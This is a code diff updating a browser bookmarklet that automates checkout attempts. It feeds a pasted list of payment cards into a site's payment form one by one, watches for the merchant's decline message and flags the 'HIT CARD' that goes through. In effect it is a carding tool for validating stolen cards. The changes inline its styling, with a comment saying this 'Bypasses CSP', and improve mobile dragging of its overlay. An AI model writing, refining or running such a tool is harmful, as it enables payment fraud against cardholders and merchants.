@@ -1,8 +1,7 @@
-(async function(){
-    const UI_ID="slick-v6-mobile-fix";
+javascript:(async function(){
+    const UI_ID="slick-v7-nuclear";
     const FAIL_TEXT="We are sorry, but we are unable to process your payment.";
     
-    // Cleanup if already running
     let existing=document.getElementById(UI_ID);
     if(existing){existing.remove()}
     
@@ -45,7 +44,10 @@
         }
     };
     
-    const updateStat=(txt,col)=>{const s=document.getElementById("af-stat");if(s){s.innerText=txt;s.style.color=col||"#888"}};
+    const updateStat=(txt,col)=>{
+        const s=document.getElementById("af-stat");
+        if(s){s.innerText=txt;s.style.color=col||"#888"}
+    };
     
     function handleSuccess(){
         if(!state.isRunning){return}
@@ -60,9 +62,8 @@
             sucBox.style.display="block";
             sucBox.innerText=`SUCCESS!\nHIT CARD: ${winningCard?winningCard.raw:"Unknown"}`
         }
-        updateStat("CHECKOUT SUCCESS","#0f0");
+        updateStat("SUCCESS","#0f0");
         
-        // Mobile-friendly collapse on success so you can see the page
         document.getElementById("af-body").style.display = "none";
         document.getElementById("af-min-btn").innerText = "[ + ]";
         
@@ -78,7 +79,6 @@
     
     function fillAndSubmit(card){
         if(!card){return}
-        
         window.slickLock = true; 
         
         const radioBtn=document.getElementById('payment-type-card');
@@ -168,38 +168,36 @@
         }catch(e){alert("Format Error")}
     }
     
-    /* --- MOBILE-SAFE UI CREATION --- */
-    const s=document.createElement("style");
-    // Z-INDEX MAXED TO 2147483647
-    s.innerHTML=`
-        #${UI_ID} { position: fixed; top: 15px; right: 15px; width: 250px; background: rgba(10,10,10,0.95); border: 1px solid #333; border-radius: 8px; z-index: 2147483647 !important; font-family: monospace; color: #eee; padding: 10px; box-shadow: 0 10px 30px rgba(0,0,0,0.8); } 
-        .af-h { cursor: move; touch-action: none; font-size: 11px; color: #555; display: flex; justify-content: space-between; margin-bottom: 5px; border-bottom: 1px solid #222; padding-bottom: 5px; } 
-        #af-txt { width: 100%; background: #000; border: 1px solid #222; color: #0f0; font-size: 10px; padding: 6px; box-sizing: border-box; resize: none; } 
-        .af-b { display: flex; gap: 4px; margin-top: 8px; } 
-        .af-b button { flex: 1; font-size: 10px; padding: 8px 0; cursor: pointer; background: #111; color: #eee; border: 1px solid #444; font-weight: bold; border-radius: 4px; } 
-        #af-success { display: none; background: #0b1a0b; border: 1px solid #238636; color: #0f0; font-size: 9px; padding: 6px; margin-top: 8px; word-break: break-all; }
-        #af-min-btn { padding: 0 5px; cursor: pointer; color: #fff; }
-    `;
-    document.head.appendChild(s);
-    
+    /* --- INLINE UI CREATION (Bypasses CSP and Stacking Contexts) --- */
     const ui=document.createElement("div");
     ui.id=UI_ID;
+    // Massive inline styling block
+    ui.style.cssText = "position: fixed; top: 10px; right: 10px; width: 250px; background: rgba(10,10,10,0.98); border: 2px solid #333; border-radius: 8px; z-index: 2147483647; font-family: monospace; color: #eee; padding: 10px; box-shadow: 0 15px 40px rgba(0,0,0,0.9); box-sizing: border-box; overflow: hidden;";
+    
     ui.innerHTML=`
-        <div class="af-h" id="af-drag">
-            <span>V6.9_MOBILE</span>
-            <div style="display:flex;gap:10px;align-items:center;">
+        <div id="af-drag" style="cursor: move; touch-action: none; font-size: 12px; font-weight: bold; color: #777; display: flex; justify-content: space-between; margin-bottom: 8px; border-bottom: 1px solid #333; padding-bottom: 6px; user-select: none;">
+            <span>V7.0_MOBILE</span>
+            <div style="display:flex; gap:12px; align-items:center;">
                 <span id="af-stat">IDLE</span>
-                <span id="af-min-btn">[ - ]</span>
+                <span id="af-min-btn" style="cursor:pointer; color:#fff; font-size: 14px; padding: 0 5px;">[ - ]</span>
             </div>
         </div>
         <div id="af-body">
-            <div style="font-size:9px;margin-bottom:5px;display:flex;justify-content:space-between;">RAND_CONTACT <input type="checkbox" id="af-chk" checked></div>
-            <textarea id="af-txt" rows="4"></textarea>
-            <div class="af-b"><button id="af-run" style="color:#238636;border-color:#238636;">RUN</button><button id="af-clr">CLR</button><button id="af-stop" style="color:#da3633;border-color:#da3633;">STOP</button></div>
-            <div id="af-success"></div>
+            <div style="font-size:10px; margin-bottom:6px; display:flex; justify-content:space-between; align-items:center;">
+                RAND_CONTACT <input type="checkbox" id="af-chk" checked style="transform: scale(1.2); margin:0;">
+            </div>
+            <textarea id="af-txt" rows="4" style="width: 100%; background: #000; border: 1px solid #333; color: #0f0; font-size: 11px; padding: 6px; box-sizing: border-box; resize: none; margin-bottom: 8px; font-family: monospace;"></textarea>
+            <div style="display: flex; gap: 5px;">
+                <button id="af-run" style="flex: 1; font-size: 11px; padding: 10px 0; cursor: pointer; background: #111; color: #238636; border: 1px solid #238636; font-weight: bold; border-radius: 4px;">RUN</button>
+                <button id="af-clr" style="flex: 1; font-size: 11px; padding: 10px 0; cursor: pointer; background: #111; color: #aaa; border: 1px solid #444; font-weight: bold; border-radius: 4px;">CLR</button>
+                <button id="af-stop" style="flex: 1; font-size: 11px; padding: 10px 0; cursor: pointer; background: #111; color: #da3633; border: 1px solid #da3633; font-weight: bold; border-radius: 4px;">STOP</button>
+            </div>
+            <div id="af-success" style="display: none; background: #0b1a0b; border: 1px solid #238636; color: #0f0; font-size: 10px; padding: 8px; margin-top: 10px; word-break: break-all; border-radius: 4px;"></div>
         </div>
     `;
-    document.body.appendChild(ui);
+    
+    // Attach to HTML root, NOT the body, to escape layout traps
+    (document.documentElement || document.body).appendChild(ui);
     
     document.getElementById("af-run").onclick=startAll;
     document.getElementById("af-clr").onclick=()=>document.getElementById("af-txt").value="";
@@ -210,7 +208,7 @@
         updateStat("STOPPED","#f44")
     };
     
-    /* --- COLLAPSE LOGIC (Better than hiding off-screen) --- */
+    /* --- COLLAPSE LOGIC --- */
     let isMin = false;
     document.getElementById("af-min-btn").onclick = (e) => {
         isMin = !isMin;
@@ -218,7 +216,7 @@
         if(isMin) {
             body.style.display = "none";
             e.target.innerText = "[ + ]";
-            ui.style.width = "180px"; // Shrink width slightly when collapsed
+            ui.style.width = "auto"; 
         } else {
             body.style.display = "block";
             e.target.innerText = "[ - ]";
@@ -231,7 +229,7 @@
     const header = document.getElementById("af-drag");
 
     const dragStart = (e) => {
-        if(e.target.id === "af-min-btn") return; // Ignore drag if clicking minimize button
+        if(e.target.id === "af-min-btn") return; 
         drag = true;
         const clientX = e.touches ? e.touches[0].clientX : e.clientX;
         const clientY = e.touches ? e.touches[0].clientY : e.clientY;
@@ -240,23 +238,21 @@
     
     const dragMove = (e) => {
         if(!drag) return;
-        if(e.touches) e.preventDefault(); // Prevents mobile screen from scrolling while dragging
+        if(e.touches && e.cancelable) e.preventDefault(); // Stop mobile scroll
         const clientX = e.touches ? e.touches[0].clientX : e.clientX;
         const clientY = e.touches ? e.touches[0].clientY : e.clientY;
         ui.style.left = (clientX + off[0]) + 'px';
         ui.style.top = (clientY + off[1]) + 'px';
-        ui.style.right = 'auto'; // Disable CSS right anchoring
+        ui.style.right = 'auto'; 
     };
     
     const dragEnd = () => { drag = false; };
 
-    // Desktop
     header.addEventListener('mousedown', dragStart);
-    document.addEventListener('mousemove', dragMove);
+    document.addEventListener('mousemove', dragMove, {passive: false});
     document.addEventListener('mouseup', dragEnd);
 
-    // Mobile
-    header.addEventListener('touchstart', dragStart, {passive: true});
+    header.addEventListener('touchstart', dragStart, {passive: false});
     document.addEventListener('touchmove', dragMove, {passive: false});
     document.addEventListener('touchend', dragEnd);
     document.addEventListener('touchcancel', dragEnd);
